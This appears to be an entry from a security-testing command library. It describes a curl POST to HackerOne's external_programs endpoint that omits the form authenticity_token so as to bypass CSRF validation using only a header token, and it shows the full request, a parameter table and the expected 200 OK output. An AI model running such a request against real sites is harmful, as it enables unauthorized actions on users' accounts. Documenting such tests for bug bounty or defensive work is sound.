---
id: cmd-curl-modified-post
data: >-
  curl -X POST https://hackerone.com/external_programs -H "X-CSRF-Token:
  QPxj69iMMHCtU+KrbEgKN4V2FvpgMfLSNdxMqAHlGiYc67nzsqEof33U+7Ot4b0tlyER++xPuvlP8SsyzvHg8Q=="
  -H "Cookie: __Host-session=..." -F "name=test" -F "handle=edmodotest" -F
  "about=" -F "website=edmodo.com" -F "twitter_handle=" -F
  "policy=Exclusions\\n\\nWhile researching, we'd like to ask you to refrain
  from:\\n\\n Denial of service\\n Spamming\\n Social engineering (including
  phishing) of edmodo staff or contractors\\n Any physical attempts against
  edmodo property or data centers\\n" -F "policy_url=" -F "scopes[]=" -F
  "scopes[]=" -F "offers_rewards=true" -F "thanks_url=" -F "disclosure_url=" -F
  "disclosure_method=email" -F "disclosure_email=policy@edmodo.com" -F
  "profile_picture=@/dev/null" -F "_ignore="
tags:
  - http
  - post
  - csrf
  - bypass
type: command
output: 'HTTP/1.1 200 OK ... {"handle":"edmodotest"}'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:35.814Z'
verified: false
validated: true
submitted: true
---
# curl-modified-external-program-post

## Command

```bash
curl -X POST https://hackerone.com/external_programs \
  -H "X-CSRF-Token: QPxj69iMMHCtU+KrbEgKN4V2FvpgMfLSNdxMqAHlGiYc67nzsqEof33U+7Ot4b0tlyER++xPuvlP8SsyzvHg8Q==" \
  -H "Cookie: __Host-session=..." \
  -F "name=test" \
  -F "handle=edmodotest" \
  -F "about=" \
  -F "website=edmodo.com" \
  -F "twitter_handle=" \
  -F "policy=Exclusions\\n\\nWhile researching, we'd like to ask you to refrain from:\\n\\n Denial of service\\n Spamming\\n Social engineering (including phishing) of edmodo staff or contractors\\n Any physical attempts against edmodo property or data centers\\n" \
  -F "policy_url=" \
  -F "scopes[]=" \
  -F "scopes[]=" \
  -F "offers_rewards=true" \
  -F "thanks_url=" \
  -F "disclosure_url=" \
  -F "disclosure_method=email" \
  -F "disclosure_email=policy@edmodo.com" \
  -F "profile_picture=@/dev/null" \
  -F "_ignore="
```

## Description

Sends a modified HTTP POST request omitting the form authenticity_token to bypass CSRF validation using only the header token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "X-CSRF-Token: ..."` | Header CSRF token (bypass enabler) | Yes |
| `-H "Cookie: ..."` | Session cookie | Yes |
| `-F "name=test"` | Program name | Yes |
| `-F "handle=edmodotest"` | Unique handle | Yes |
| Other `-F` fields | Form data without authenticity_token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/external_programs -H "Cookie: ..." -F "name=test" ...
```

### Advanced Usage

Omit authenticity_token as shown to test bypass.

## Expected Output

HTTP 200 OK with JSON {"handle":"edmodotest"}, confirming creation despite missing form token.

## Related

- [[commands/curl-original-external-program-post]]
